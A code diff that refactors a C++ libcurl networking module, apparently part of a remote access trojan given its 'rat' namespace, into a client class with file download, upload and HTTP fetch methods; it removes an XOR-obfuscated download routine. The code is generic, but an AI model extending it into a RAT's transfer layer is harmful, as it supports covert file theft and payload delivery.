@@ -1,126 +1,170 @@
 #include "rat/networking.hpp"
 #include <fstream>
 #include <iostream>
+#include <vector>
+#include <string>
+#include <filesystem>
+#include <cstdio>
+#include <cstring>
 
 #include "logging.hpp"
+
 namespace rat::networking {
 
-// Internal helper: Write callback for cURL
-static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
-    std::vector<char>* buffer = static_cast<std::vector<char>*>(userp);
-    size_t totalSize = size * nmemb;
-    buffer->insert(buffer->end(), static_cast<char*>(contents), static_cast<char*>(contents) + totalSize);
-    return totalSize;
-}
-
-// Internal helper: Write callback for FILE*
-static size_t WriteFileCallback(void* contents, size_t size, size_t nmemb, void* userp) {
-    FILE* fp = static_cast<FILE*>(userp);
-    return fwrite(contents, size, nmemb, fp);
-}
+// ------------------------------
+// Helpers
+// ------------------------------
 
 std::filesystem::path _getFilePathFromUrl(const std::string& arg_Url) {
     std::string filename = arg_Url.substr(arg_Url.find_last_of("/\\") + 1);
     if (filename.empty()) filename = "downloaded_file";
-    return std::filesystem::temp_directory_path() / filename;
+    return std::filesystem::path(filename);
 }
 
-// === Public API ===
+// Callbacks (prefixed with _ as requested)
+static size_t _cbHeapWrite(void* p_Contents, size_t arg_Size, size_t arg_Nmemb, void* p_User) {
+    auto* buffer = static_cast<std::vector<char>*>(p_User);
+    const size_t total_size = arg_Size * arg_Nmemb;
+    const char* src = static_cast<const char*>(p_Contents);
+    buffer->insert(buffer->end(), src, src + total_size);
+    return total_size;
+}
 
-NetworkingResponse downloadFile(const std::string& arg_Url, const std::filesystem::path& File_Path) {
-    NetworkingResponse response{};
-    auto start = std::chrono::steady_clock::now();
+static size_t _cbFileWrite(void* p_Contents, size_t arg_Size, size_t arg_Nmemb, void* p_User) {
+    FILE* fp = static_cast<FILE*>(p_User);
+    return std::fwrite(p_Contents, arg_Size, arg_Nmemb, fp);
+}
 
-    CURL* curl = curl_easy_init();
-    if (!curl) {
-        response.status = NetworkingResponseStatus::UNKNOWN_FAILURE;
-        ERROR_LOG("curl failed to initialize");
-        return response;
+static size_t _cbStackWrite(void* p_Contents, size_t arg_Size, size_t arg_Nmemb, void* p_User) {
+    const size_t total_size = arg_Size * arg_Nmemb;
+    auto* context = static_cast<BufferContext*>(p_User);
+
+    const size_t space_left = (context->capacity > context->size) ? (context->capacity - context->size) : 0;
+    const size_t copy_size  = (total_size < space_left) ? total_size : space_left;
+
+    if (copy_size > 0) {
+        std::memcpy(context->buffer + context->size, p_Contents, copy_size);
+        context->size += copy_size;
     }
 
-    FILE* fp = fopen(File_Path.string().c_str(), "wb");
+    // Returning fewer bytes than provided tells libcurl we handled only part of it (truncate)
+    return copy_size;
+}
+
+// ------------------------------
+// EasyCurlHandler
+// ------------------------------
+
+EasyCurlHandler::EasyCurlHandler()
+    : curl(curl_easy_init()), state(CURLE_OK) {}
+
+EasyCurlHandler::~EasyCurlHandler() {
+    if (this->curl) {
+        curl_easy_cleanup(this->curl);
+        this->curl = nullptr;
+    }
+}
+
+CURLcode EasyCurlHandler::setOption(CURLoption Curl_Option, long value) {
+    this->state = curl_easy_setopt(this->curl, Curl_Option, value);
+    return this->state;
+}
+
+CURLcode EasyCurlHandler::setOption(CURLoption Curl_Option, const char* value) {
+    this->state = curl_easy_setopt(this->curl, Curl_Option, value);
+    return this->state;
+}
+
+CURLcode EasyCurlHandler::setOption(CURLoption Curl_Option, void* value) {
+    this->state = curl_easy_setopt(this->curl, Curl_Option, value);
+    return this->state;
+}
+
+CURLcode EasyCurlHandler::setUrl(const std::string& arg_Url) {
+    this->state = curl_easy_setopt(this->curl, CURLOPT_URL, arg_Url.c_str());
+    return this->state;
+}
+
+CURLcode EasyCurlHandler::setWriteCallBackFunction(WriteCallback Call_Back) {
+    this->state = curl_easy_setopt(this->curl, CURLOPT_WRITEFUNCTION, Call_Back);
+    return this->state;
+}
+
+CURLcode EasyCurlHandler::perform() {
+    this->state = curl_easy_perform(this->curl);
+    return this->state;
+}
+void EasyCurlHandler::reset() {
+    if(this->curl) {
+        curl_easy_reset(this->curl);
+    }
+}
+
+// ------------------------------
+// Client
+// ------------------------------
+
+bool Client::download(const std::string& Downloading_Url, const std::filesystem::path& File_Path) {
+    if (!this->curl) return false;
+
+    FILE* fp = std::fopen(File_Path.string().c_str(), "wb");
     if (!fp) {
-        curl_easy_cleanup(curl);
-        ERROR_LOG("Failed to open file for writing");
-        response.status = NetworkingResponseStatus::FILE_CREATION_FAILURE;
-        return response;
+        ERROR_LOG("Failed to open file for writing: %s", File_Path.string().c_str());
+        return false;
     }
 
-    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteFileCallback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+    setUrl(Downloading_Url);
+    setWriteCallBackFunction(&_cbFileWrite);
+    setOption(CURLOPT_WRITEDATA, static_cast<void*>(fp));
+    setOption(CURLOPT_FOLLOWLOCATION, 1L);
+    setOption(CURLOPT_SSL_VERIFYPEER, 1L);
+    setOption(CURLOPT_SSL_VERIFYHOST, 2L);
+    setOption(CURLOPT_TIMEOUT, 30L);
 
-
-    CURLcode res = curl_easy_perform(curl);
-    fclose(fp);
-    curl_easy_cleanup(curl);
-
-    response.duration = std::chrono::duration_cast<std::chrono::milliseconds>(
-        std::chrono::steady_clock::now() - start);
-
-    if (res != CURLE_OK) {
-        response.status = NetworkingResponseStatus::CONNECTION_FAILURE;
-        return response;
-    }
-
-    response.status = NetworkingResponseStatus::SUCCESS;
-    return response;
+    this->perform();
+    std::fclose(fp);
+    this->reset();
+    return (this->state == CURLE_OK);
 }
 
-NetworkingResponse uploadFile(const std::filesystem::path& File_Path, const std::string& arg_Url) {
-    NetworkingResponse response{};
-    auto start = std::chrono::steady_clock::now();
-
-    if (!std::filesystem::exists(File_Path)) {
-        response.status = NetworkingResponseStatus::FILE_CREATION_FAILURE;
-        return response;
-    }
-
-    CURL* curl = curl_easy_init();
-    if (!curl) {
-        response.status = NetworkingResponseStatus::UNKNOWN_FAILURE;
-        return response;
-    }
-
-    curl_mime* mime = curl_mime_init(curl);
-    curl_mimepart* part = curl_mime_addpart(mime);
-    curl_mime_filedata(part, File_Path.string().c_str());
-
-    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
-    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
-
-    CURLcode res = curl_easy_perform(curl);
-    curl_mime_free(mime);
-    curl_easy_cleanup(curl);
-
-    response.duration = std::chrono::duration_cast<std::chrono::milliseconds>(
-        std::chrono::steady_clock::now() - start);
-
-    response.status = (res == CURLE_OK) ? NetworkingResponseStatus::SUCCESS
-                                        : NetworkingResponseStatus::CONNECTION_FAILURE;
-    return response;
+bool Client::download(const std::string& Download_Url) {
+    // Download into current directory using filename from URL
+    auto path = std::filesystem::current_path() / _getFilePathFromUrl(Download_Url);
+    return download(Download_Url, path);
 }
 
-NetworkingResponse uploadMimeFile(const std::filesystem::path& File_Path,
-                                  const std::string& arg_Url,
-                                  const std::string& Field_Name,
-                                  const std::string& Mime_Type) {
-    NetworkingResponse response{};
-    if (!std::filesystem::exists(File_Path)) {
-        response.status = NetworkingResponseStatus::FILE_CREATION_FAILURE;
-        return response;
+bool Client::upload(const std::filesystem::path& File_Path, const std::string& Uploading_Url) {
+    if (!this->curl || !std::filesystem::exists(File_Path)) return false;
+
+    FILE* fp = std::fopen(File_Path.string().c_str(), "rb");
+    if (!fp) {
+        ERROR_LOG("Failed to open file for reading: %s", File_Path.string().c_str());
+        return false;
     }
 
-    CURL* curl = curl_easy_init();
-    if (!curl) {
-        response.status = NetworkingResponseStatus::UNKNOWN_FAILURE;
-        return response;
-    }
+    setUrl(Uploading_Url);
+    setOption(CURLOPT_UPLOAD, 1L);
+    setOption(CURLOPT_READDATA, static_cast<void*>(fp));
+    setOption(CURLOPT_INFILESIZE_LARGE, static_cast<curl_off_t>(std::filesystem::file_size(File_Path)));
+    setOption(CURLOPT_SSL_VERIFYPEER, 1L);
+    setOption(CURLOPT_SSL_VERIFYHOST, 2L);
+    setOption(CURLOPT_TIMEOUT, 30L);
 
-    curl_mime* mime = curl_mime_init(curl);
+    this->perform();
+    std::fclose(fp);
+    this->reset();
+    return (this->state == CURLE_OK);
+}
+
+bool Client::uploadMimeFile(const std::filesystem::path& File_Path,
+                            const std::string& arg_Url,
+                            const std::string& Field_Name,
+                            const std::string& Mime_Type) {
+    if (!this->curl || !std::filesystem::exists(File_Path)) return false;
+
+    curl_mime* mime = curl_mime_init(this->curl);
+    if (!mime) return false;
+
     curl_mimepart* part = curl_mime_addpart(mime);
     curl_mime_name(part, Field_Name.c_str());
     curl_mime_filedata(part, File_Path.string().c_str());
@@ -128,119 +172,83 @@ NetworkingResponse uploadMimeFile(const std::filesystem::path& File_Path,
         curl_mime_type(part, Mime_Type.c_str());
     }
 
-    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
-    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
+    setUrl(arg_Url);
+    setOption(CURLOPT_MIMEPOST, static_cast<void*>(mime));
+    setOption(CURLOPT_SSL_VERIFYPEER, 1L);
+    setOption(CURLOPT_SSL_VERIFYHOST, 2L);
+    setOption(CURLOPT_TIMEOUT, 30L);
 
-    CURLcode res = curl_easy_perform(curl);
+    this->perform();
     curl_mime_free(mime);
-    curl_easy_cleanup(curl);
 
-    response.status = (res == CURLE_OK) ? NetworkingResponseStatus::SUCCESS
-                                        : NetworkingResponseStatus::CONNECTION_FAILURE;
-    return response;
+    this->reset();
+    return (this->state == CURLE_OK);
 }
 
-NetworkingResponse uploadMimeRawBytes(const uint8_t* p_Raw_Bytes, size_t Data_Size,
-                                      const std::string& arg_Url, const std::string& Mime_Type) {
-    NetworkingResponse response{};
-    auto start = std::chrono::steady_clock::now();
-
-    if (!p_Raw_Bytes || Data_Size == 0) {
-        response.status = NetworkingResponseStatus::FILE_CREATION_FAILURE;
-        return response;
-    }
-
-    CURL* curl = curl_easy_init();
-    if (!curl) {
-        response.status = NetworkingResponseStatus::UNKNOWN_FAILURE;
-        return response;
-    }
-
-    curl_mime* mime = curl_mime_init(curl);
-    curl_mimepart* part = curl_mime_addpart(mime);
-    curl_mime_data(part, reinterpret_cast<const char*>(p_Raw_Bytes), Data_Size);
-    if (!Mime_Type.empty()) {
-        curl_mime_type(part, Mime_Type.c_str());
-    }
-
-    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
-    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
-
-    CURLcode res = curl_easy_perform(curl);
-    curl_mime_free(mime);
-    curl_easy_cleanup(curl);
-
-    response.duration = std::chrono::duration_cast<std::chrono::milliseconds>(
-        std::chrono::steady_clock::now() - start);
-
-    response.status = (res == CURLE_OK) ? NetworkingResponseStatus::SUCCESS
-                                        : NetworkingResponseStatus::CONNECTION_FAILURE;
-    return response;
-}
-
-std::vector<char> sendHttpRequest(const std::string& arg_Url) {
+std::vector<char> Client::sendHttpRequest(const std::string& arg_Url) {
     std::vector<char> buffer;
-    CURL* curl = curl_easy_init();
-    if (!curl) return buffer;
+    if (!this->curl) return buffer;
 
-    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
-    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
+    this->setUrl(arg_Url);
+    this->setWriteCallBackFunction(&_cbHeapWrite);
+    this->setOption(CURLOPT_WRITEDATA, static_cast<void*>(&buffer));
+    this->setOption(CURLOPT_SSL_VERIFYPEER, 1L);
+    this->setOption(CURLOPT_SSL_VERIFYHOST, 2L);
+    this->setOption(CURLOPT_FOLLOWLOCATION, 1L);
+    this->setOption(CURLOPT_TIMEOUT, 30L);
 
-    CURLcode res = curl_easy_perform(curl);
-    curl_easy_cleanup(curl);
-
-    if (res != CURLE_OK) buffer.clear();
+    this->perform();
+    if (this->state != CURLE_OK) buffer.clear();
+    
+    this->reset();
     return buffer;
 }
 
-size_t sendHttpRequest(const std::string& arg_Url, char* Response_Buffer, size_t Response_Buffer_Size) {
-    std::vector<char> tempBuffer = sendHttpRequest(arg_Url);
-    size_t copySize = std::min(Response_Buffer_Size, tempBuffer.size());
-    if (copySize > 0) {
-        std::memcpy(Response_Buffer, tempBuffer.data(), copySize);
-    }
-    return copySize;
+size_t Client::sendHttpRequest(const std::string& arg_Url, char* p_Buffer, size_t Buffer_Size) {
+    if (!this->curl || !p_Buffer || Buffer_Size == 0) return 0;
+
+    BufferContext ctx{p_Buffer, Buffer_Size, 0};
+
+    this->setUrl(arg_Url);
+    this->setWriteCallBackFunction(&_cbStackWrite);
+    this->setOption(CURLOPT_WRITEDATA, static_cast<void*>(&ctx));
+    this->setOption(CURLOPT_SSL_VERIFYPEER, 1L);
+    this->setOption(CURLOPT_SSL_VERIFYHOST, 2L);
+    this->setOption(CURLOPT_FOLLOWLOCATION, 1L);
+    this->setOption(CURLOPT_TIMEOUT, 30L);
+
+    this->perform();
+    
+    this->reset();
+    return (this->state == CURLE_OK) ? ctx.size : 0;
 }
 
-bool downloadData(const std::string& arg_Url, std::vector<uint8_t>& Out_Buffer) {
-    std::vector<char> temp = sendHttpRequest(arg_Url);
-    if (temp.empty()) return false;
-    Out_Buffer.assign(temp.begin(), temp.end());
-    return true;
+static size_t _cbVectorUint8Write(void* p_Contents, size_t arg_Size, size_t arg_Nmemb, void* p_User) {
+    auto* buffer = static_cast<std::vector<uint8_t>*>(p_User);
+    const size_t total_size = arg_Size * arg_Nmemb;
+    const uint8_t* src = static_cast<const uint8_t*>(p_Contents);
+    buffer->insert(buffer->end(), src, src + total_size);
+    return total_size;
 }
 
-bool downloadDataIntoBuffer(const std::string& arg_Url, std::vector<uint8_t> Data_Vector) {
-    std::vector<char> temp = sendHttpRequest(arg_Url);
-    if (temp.empty()) return false;
-    Data_Vector.assign(temp.begin(), temp.end());
-    return true;
-}
+bool Client::downloadData(const std::string& arg_Url, std::vector<uint8_t>& Out_Buffer) {
+    if (!this->curl) return false;
 
-bool downloadDataObfuscatedWithXor(const std::string& arg_Url,
-                                   std::vector<uint8_t>& Out_Buffer,
-                                   const char* Xor_Key) {
-    if (!Xor_Key || *Xor_Key == '\0') return false;
+    Out_Buffer.clear();
 
-    std::vector<char> temp = sendHttpRequest(arg_Url);
-    if (temp.empty()) return false;
+    this->setUrl(arg_Url);
+    this->setWriteCallBackFunction(&_cbVectorUint8Write);
+    this->setOption(CURLOPT_WRITEDATA, static_cast<void*>(&Out_Buffer));
+    this->setOption(CURLOPT_SSL_VERIFYPEER, 1L);
+    this->setOption(CURLOPT_SSL_VERIFYHOST, 2L);
+    this->setOption(CURLOPT_FOLLOWLOCATION, 1L);
+    this->setOption(CURLOPT_TIMEOUT, 30L);
 
-    size_t keyLen = std::strlen(Xor_Key);
-    Out_Buffer.resize(temp.size());
-    for (size_t i = 0; i < temp.size(); ++i) {
-        Out_Buffer[i] = static_cast<uint8_t>(temp[i] ^ Xor_Key[i % keyLen]);
-    }
-    return true;
+    this->perform();
+    
+    this->reset();
+    return (this->state == CURLE_OK);
 }
 
 } // namespace rat::networking
+
